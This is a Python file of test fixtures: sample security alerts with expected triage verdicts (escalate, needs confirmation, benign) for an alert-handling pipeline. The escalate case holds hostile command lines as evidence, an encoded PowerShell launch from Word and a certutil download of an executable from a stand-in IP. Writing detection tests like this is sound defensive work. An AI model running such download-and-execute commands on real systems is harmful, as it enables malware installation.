"""Sample Alert Records (schema v3) for the /test route: escalate, needs_user_confirmation, benign."""
import copy


def _base(cid, aid, rule, upn, host):
    return {
        "schema_version": "3", "correlation_id": cid,
        "alert": {
            "id": aid, "source": "sentinel", "source_url": None, "rule_name": rule, "title": rule,
            "description": "Sample alert", "severity": "medium", "tactics": [], "techniques": [],
            "first_seen": "2026-11-05T14:00:00Z", "last_seen": "2026-11-05T14:30:00Z",
            "user": {"upn": upn, "display_name": None},
            "host": {"hostname": host, "device_id": None, "os": "Windows 11"},
            "network": {"source_ips": [], "destination_ips": [], "countries": []},
            "iocs": {"ips": [], "domains": [], "urls": [], "hashes": []},
            "evidence": [], "raw": {},
        },
        "dedup_key": "0" * 64,
        "case": {"id": None, "url": None, "status": None},
        "triage": {"disposition": "INVESTIGATE", "reason": "No duplicate or allowlist match.",
                   "matched_case_id": None, "matched_allowlist_entry": {}, "checks": []},
        "enrichment": {
            "ioc_results": [], "ioc_summary": {"malicious": 0, "suspicious": 0, "clean": 0, "unknown": 0},
            "user_context": {
                "provider": "okta", "status": "ACTIVE", "groups": ["Everyone"], "mfa_factors": ["push"],
                "last_login": "2026-11-05T09:00:00Z",
                "recent_logins": [
                    {"time": "2026-11-04T09:00:00Z", "ip": "203.0.113.10", "country": "US"},
                    {"time": "2026-11-05T09:00:00Z", "ip": "203.0.113.10", "country": "US"},
                ],
                "error": None,
            },
            "host_context": {"provider": "crowdstrike", "found": True, "platform": "Windows",
                             "last_seen": "2026-11-05T14:00:00Z", "sensor_version": "7.10", "tags": [],
                             "containment_status": "normal", "error": None},
        },
        "investigation": None, "response": None,
        "trace": [{"component": "Alert Triage", "decision": "INVESTIGATE", "reason": "No match.",
                   "duration_ms": 12, "run_url": None, "error": None}],
    }


def _escalate():
    r = _base("11111111-1111-4111-8111-111111111111", "alert-esc-001",
              "Suspicious PowerShell download", "jdoe@example.com", "WS-0142")
    r["alert"]["source"] = "crowdstrike"
    r["alert"]["evidence"] = [
        {"type": "process", "timestamp": "2026-11-05T14:05:00Z",
         "details": {"command_line": "powershell.exe -NoP -enc SQBFAFgAIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAKQ==",
                     "parent": "winword.exe"}},
        {"type": "process", "timestamp": "2026-11-05T14:06:00Z",
         "details": {"command_line": "certutil.exe -urlcache -split -f http://198.51.100.7/p.exe C:\\Temp\\p.exe"}},
    ]
    r["enrichment"]["ioc_results"] = [
        {"ioc": "198.51.100.7", "ioc_type": "ip", "provider": "abuseipdb", "verdict": "malicious",
         "score": 97, "details": {}, "cached": False, "error": None},
        {"ioc": "example.org", "ioc_type": "domain", "provider": "virustotal", "verdict": "clean",
         "score": 0, "details": {}, "cached": False, "error": None},
    ]
    r["enrichment"]["ioc_summary"] = {"malicious": 1, "suspicious": 0, "clean": 1, "unknown": 0}
    r["enrichment"]["user_context"]["groups"] = ["Everyone", "IT-Admins"]
    # Host last seen 10 days before the alert → stale host (low, raised to medium by privilege).
    r["enrichment"]["host_context"]["last_seen"] = "2026-10-26T08:00:00Z"
    return r


def _needs_confirmation():
    r = _base("22222222-2222-4222-8222-222222222222", "alert-conf-001",
              "Atypical travel", "asmith@example.com", None)
    r["alert"]["evidence"] = [
        {"type": "signin", "timestamp": "2026-11-05T13:10:00Z",
         "details": {"ip": "203.0.113.10", "country": "US", "result": "success", "client_app": "Browser"}},
        {"type": "signin", "timestamp": "2026-11-05T14:20:00Z",
         "details": {"ip": "192.0.2.55", "country": "BR", "result": "failure", "client_app": "Browser"}},
        {"type": "signin", "timestamp": "2026-11-05T14:22:00Z",
         "details": {"ip": "192.0.2.55", "country": "BR", "result": "success", "client_app": "Browser"}},
    ]
    r["enrichment"]["host_context"] = None
    return r


def _benign():
    r = _base("33333333-3333-4333-8333-333333333333", "alert-ben-001",
              "Rare process on host", "bwong@example.com", "WS-0077")
    r["alert"]["evidence"] = [
        {"type": "process", "timestamp": "2026-11-05T14:05:00Z",
         "details": {"command_line": "C:\\Program Files\\Notepad++\\notepad++.exe C:\\notes.txt"}},
        {"type": "signin", "timestamp": "2026-11-05T14:00:00Z",
         "details": {"ip": "203.0.113.10", "country": "US", "result": "success", "client_app": "Browser"}},
    ]
    r["enrichment"]["ioc_results"] = [
        {"ioc": "203.0.113.10", "ioc_type": "ip", "provider": "greynoise", "verdict": "clean",
         "score": 0, "details": {}, "cached": True, "error": None},
    ]
    r["enrichment"]["ioc_summary"] = {"malicious": 0, "suspicious": 0, "clean": 1, "unknown": 0}
    return r


FIXTURES = [
    {"name": "escalate", "expected_verdict": "escalate", "build": _escalate},
    {"name": "needs_user_confirmation", "expected_verdict": "needs_user_confirmation", "build": _needs_confirmation},
    {"name": "benign", "expected_verdict": "benign", "build": _benign},
]


def all_fixtures():
    return [{"name": f["name"], "expected_verdict": f["expected_verdict"], "record": copy.deepcopy(f["build"]())}
            for f in FIXTURES]
